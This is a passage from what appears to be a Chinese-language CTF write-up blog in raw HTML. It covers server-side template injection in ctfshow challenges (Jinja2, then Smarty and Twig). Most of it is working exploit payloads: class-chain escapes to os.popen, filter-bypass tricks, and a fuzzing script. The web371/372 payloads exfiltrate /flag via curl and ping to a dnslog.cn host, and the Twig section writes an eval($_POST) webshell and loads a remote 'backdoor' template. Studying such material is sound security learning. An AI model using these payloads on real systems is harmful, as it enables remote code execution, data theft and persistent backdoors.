class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;class &#x27;type&#x27;&gt;,...,&lt;class &#x27;subprocess.Popen&#x27;&gt; # 所有子类</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>num = <span class="hljs-number">0</span><br>allList = []<br><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;&gt;&quot;</span>:<br>        result += i<br>        allList.append(result)<br>        result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">elif</span> i == <span class="hljs-string">&quot;\n&quot;</span> <span class="hljs-keyword">or</span> i == <span class="hljs-string">&quot;,&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        result += i<br><br><span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(allList):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;os._wrap_close&quot;</span> <span class="hljs-keyword">in</span> v:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(k)+<span class="hljs-string">&quot;---&gt;&quot;</span>+v)<br></code></pre></td></tr></table></figure><p>还可以使用 url 请求的方式去跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">300</span>):<br>    time.sleep(<span class="hljs-number">0.60</span>)<br>    payload = <span class="hljs-string">&quot;&quot;</span>%i<br>    url = <span class="hljs-string">&quot;http://xxx/&quot;</span><br>    r = requests.request(url=url,param=payload)<br>    <span class="hljs-comment">#可以替换为其他的</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;os._wrap_close&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>ctfshow362 过滤了数字 2、3</p><p>ctfshow363 过滤了单双引号，采用变量逃逸的传参方法</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[132].__init__.__globals__[&#x27;__builtins__&#x27;].eval(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /f*&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">==&gt;</span><br><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[132].__init__.__globals__[request.args.a].eval(<span class="hljs-name">request.args.b</span>)&#125;&#125;</span><span class="xml">&amp;a=__builtins__&amp;b=__import__(&#x27;os&#x27;).popen(&#x27;tac /f*&#x27;).read()</span><br><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[132].__init__.__globals__[request.args.a](<span class="hljs-name">request.args.b</span>).read()&#125;&#125;</span><span class="xml">&amp;a=popen&amp;b=tac /f*</span><br></code></pre></td></tr></table></figure><p>ctfshow364 过滤了 args 应该</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220103143249696.png"></p><p>可以 Cookie 带进去 request.args.a 换为 request.cookies.a</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220103143356540.png"></p><p>注意 cookie 的解析格式 以 <strong>;</strong> 分隔 :(</p><blockquote><p>其他传参方式：</p><p>request.form.x1 post 传参 (Content-Type:applicaation/x-www-form-urlencoded 或 multipart/form-data)<br>request.data post 传参 (Content-Type:a/b)<br>request.json post 传 json (Content-Type: application/json)</p></blockquote><p>ctfshow365 过滤了中括号[]和单引号‘’，可以使用__getitem__和 pop 替代中括号</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">http://faf87e47-725e-4618-b993-8e8e430370d5.challenge.ctf.show/?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.__getitem__</span>(<span class="hljs-name">request.cookies.a</span>).popen(<span class="hljs-name">request.cookies.b</span>).read()&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">Cookiea=os;b=tac /f*</span><br></code></pre></td></tr></table></figure><p>—–这里开始不会:(</p><h2 id="ctfshow366、367"><a href="#ctfshow366、367" class="headerlink" title="ctfshow366、367"></a>ctfshow366、367</h2><p>过滤了下划线_，使用 flask 的过滤器</p><p>palyoad</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">?name=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">x</span>|attr(<span class="hljs-name">request.cookies.x1</span>)|attr(<span class="hljs-name">request.cookies.x2</span>)|attr(<span class="hljs-name">request.cookies.x3</span>))(<span class="hljs-name">request.cookies.x4</span>).eval(<span class="hljs-name">request.cookies.x5</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">Cookiex1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><p>chr 函数的方法：</p><p>首先 fuzz 到 chr 函数的位置</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;&#123;<span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__base__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__subclasses__</span>(</span></span>)<br><span class="hljs-literal">[§<span class="hljs-number">0</span>§]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__builtins__</span>.</span></span>chr&#125;&#125;<br></code></pre></td></tr></table></figure><p>选择一个</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&#123;%set+chr=<span class="hljs-literal">[]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__bases__</span>[</span></span><span class="hljs-number">0</span>].<span class="hljs-constructor">__subclasses__()</span><br><span class="hljs-literal">[<span class="hljs-identifier">x</span>]</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__init__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__globals__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__builtins__</span>.</span></span>chr%&#125;<br></code></pre></td></tr></table></figure><p>绕过</p><figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs hy">&#123;%set+chr=[].__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()<br>[x].__init__.__globals__.__builtins__.chr%&#125;<br>&#123;&#123;[].__class__.__base__.__subclasses__()<br>[y].__init__.__globals__[chr(<span class="hljs-number">111</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)]<br>[chr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">111</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">112</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">101</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">110</span>)]<br>(<span class="hljs-name"><span class="hljs-builtin-name">chr</span></span>(<span class="hljs-number">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)).read()&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h2><p>过滤了<code>&#123;&#123;`和`&#125;&#125;</code>，使用<code>&#123;%%&#125;</code>绕过</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Payload:?name=&#123;% <span class="hljs-builtin-name">print</span>(((lipsum|attr(request.cookies.c))|attr(request.cookies.d)(request.cookies.a)).popen(request.cookies.b).read())%&#125;<br>带上Cookie:<span class="hljs-attribute">a</span>=os;b=cat /flag;<span class="hljs-attribute">c</span>=__globals__;d=__getitem__<br></code></pre></td></tr></table></figure><h2 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h2><p>过滤了<code>request</code><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTI 进阶文章</a></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(18)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(9)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-8)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(cat=aa)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span> ((lipsum|attr(c))|attr(d)(e)).popen(i).read()%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h2><p>数字不能用了，使用 count 进行计数</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> j=dict(eeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> k=dict(eeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> l=dict(eeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(j)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(k)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(cat=aa)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span> ((lipsum|attr(c))|attr(d)(e)).popen(i).read()%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h2><p>过滤了<code>print</code>外带数据</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping `cat /flag`.vhthja.dnslog.cn<br></code></pre></td></tr></table></figure><p>ping 不能用，换 curl 可以</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> j=dict(eeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> k=dict(eeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> l=dict(eeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> m=dict(eeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|count%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(j)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(k)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(curl=aa)|<span class="hljs-keyword">join</span>,f,p,dict(cat=a)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>,p,q,dict(vhthja=a)|<span class="hljs-keyword">join</span>,q,dict(dnslog=a)|<span class="hljs-keyword">join</span>,q,dict(cn=a)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">if</span></span> ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;</span><span class="xml">atao</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">endif</span></span>%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h2><p>过滤了 count，可以用 length 替代 count</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="xml">Payload:?name=</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> a=dict(po=aa,p=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> j=dict(eeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> k=dict(eeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> l=dict(eeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> m=dict(eeeeeeeeeeeeeeeeeeee=a)|<span class="hljs-keyword">join</span>|<span class="hljs-keyword">length</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> b=(lipsum|string|list)|attr(a)(j)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> c=(b,b,dict(glob=cc,als=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> d=(b,b,dict(getit=cc,em=aa)|<span class="hljs-keyword">join</span>,b,b)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> e=dict(o=cc,s=aa)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-keyword">set</span></span> f=(lipsum|string|list)|attr(a)(k)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">set</span></span> i=(dict(curl=aa)|<span class="hljs-keyword">join</span>,f,p,dict(cat=a)|<span class="hljs-keyword">join</span>,f,g,dict(flag=aa)|<span class="hljs-keyword">join</span>,p,q,dict(fgpozq=a)|<span class="hljs-keyword">join</span>,q,dict(dnslog=a)|<span class="hljs-keyword">join</span>,q,dict(cn=a)|<span class="hljs-keyword">join</span>)|<span class="hljs-keyword">join</span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">if</span></span> ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;</span><span class="xml">atao</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-keyword">endif</span></span>%&#125;</span><br></code></pre></td></tr></table></figure><p>补几个模板</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg"></p><p>PHP</p><ul><li>Smarty</li></ul><p>[BJDCTF2020]The mystery of ip</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure><ul><li>twig</li></ul><p>[BJDCTF2020]Cookie is so stable</p><p><a href="https://xz.aliyun.com/t/10056">https://xz.aliyun.com/t/10056</a></p><p>twig 1.x</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">//远程frp包含</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.setCache</span>(<span class="hljs-name">&quot;ftp://ip:port&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.loadTemplate</span>(<span class="hljs-name">&quot;backdoor&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">//rce</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;ls /&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>twig 2.x/3.x|使用其新版本的过滤器</p><p>map 过滤器</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="xml"> //没有回显</span><br><span class="xml"></span><br><span class="xml">当命令执行都被禁用时，尝试写shell</span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;phpinfo();&quot;]</span>|map(<span class="hljs-name">&quot;assert&quot;</span>)|join(<span class="hljs-name">&quot;,&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;&#123;<span class="hljs-name">&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;</span>:<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="hljs-name">&quot;file_put_content</span></span><br><span class="hljs-name"><span class="hljs-template-variable">s&quot;</span>)&#125;&#125; // <span class="hljs-name">写</span> Webshell</span><br></code></pre></td></tr></table></figure><p>sort 过滤器</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|sort(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|sort(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|sort(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="xml"> //没有回显</span><br></code></pre></td></tr></table></figure><p>filter 过滤器</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="xml"> //没有回显</span><br></code></pre></td></tr></table></figure><p>reduce 过滤器</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;system&quot;</span>, <span 